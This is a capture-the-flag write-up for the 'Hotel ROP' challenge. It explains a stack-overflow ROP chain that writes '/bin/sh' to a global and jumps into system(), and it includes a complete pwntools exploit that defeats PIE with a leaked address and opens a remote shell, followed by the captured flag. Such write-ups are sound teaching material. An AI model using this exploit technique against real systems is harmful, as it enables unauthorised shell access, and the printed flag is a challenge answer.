# Hotel ROP

They say programmers' dream is California. And because they need somewhere to stay, we've built a hotel!
nc dctf1-chall-hotel-rop.westeurope.azurecontainer.io 7480

## Challenge

ROP challenge that requires a global variable to be set up prior to a `system` call.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Stage 1

```c
void sym.california(void)
{
    sym.imp.puts("Welcome to Hotel California");
    sym.imp.puts("You can sign out anytime you want, but you can never leave");
    obj.win_land[_obj.len] = (code)0x2f;
    _obj.len = _obj.len + 1;
    obj.win_land[_obj.len] = (code)0x62;
    _obj.len = _obj.len + 1;
    obj.win_land[_obj.len] = (code)0x69;
    _obj.len = _obj.len + 1;
    obj.win_land[_obj.len] = (code)0x6e;
    _obj.len = _obj.len + 1;
    return;
}
```

### Stage 2

```c
void sym.silicon_valley(void)
{
    sym.imp.puts("You want to work for Google?");
    obj.win_land[_obj.len] = (code)0x2f;
    _obj.len = _obj.len + 1;
    obj.win_land[_obj.len] = (code)0x73;
    _obj.len = _obj.len + 1;
    obj.win_land[_obj.len] = (code)0x68;
    _obj.len = _obj.len + 1;
    obj.win_land[_obj.len] = (code)0x0;
    _obj.len = _obj.len + 1;
    return;
}
```

### Stage 3

```c
void sym.loss(uint32_t arg1, int64_t arg2)
{
    uint32_t var_4h;
    
    if ((int32_t)arg2 + arg1 == -0x21523f22) {
        sym.imp.puts("Dis is da wae to be one of our finest guests!");
        if (arg1 == 0x1337c0de) {
            sym.imp.puts("Now you can replace our manager!");
            sym.imp.system(obj.win_land);
            sym.imp.exit(0);
        }
    }
    return;
}
```

## Solution

The `california` and `silicon_valley` functions, when called in that order, will write `"/bin/sh"` to the `win_land` global variable.

The `loss` function will call system on whatever is stored in the `win_land` global variable.
`loss` also requires that 2 arguments are set to specific values, but this can be bypassed by jumping directly to the system call.

Using a buffer overflow, we can call these 3 functions to spawn a shell.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host dctf1-chall-hotel-rop.westeurope.azurecontainer.io --port 7480 hotel_rop
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('hotel_rop')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'dctf1-chall-hotel-rop.westeurope.azurecontainer.io'
port = int(args.PORT or 7480)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.recvuntil("street ")

leak = io.recvuntil("\n", drop=True)

main = int(leak, 0)
exe.address = main - 0x0000136d

io.success(hex(exe.address))

payload = flat({
    0x20 + 0x8: [
        exe.sym["california"],
        exe.sym["silicon_valley"],
        exe.address + 0x000011c3,
        ],
    })

io.sendline(payload)

io.interactive()
```

## Flag

`dctf{ch41n_0f_h0t3ls}`

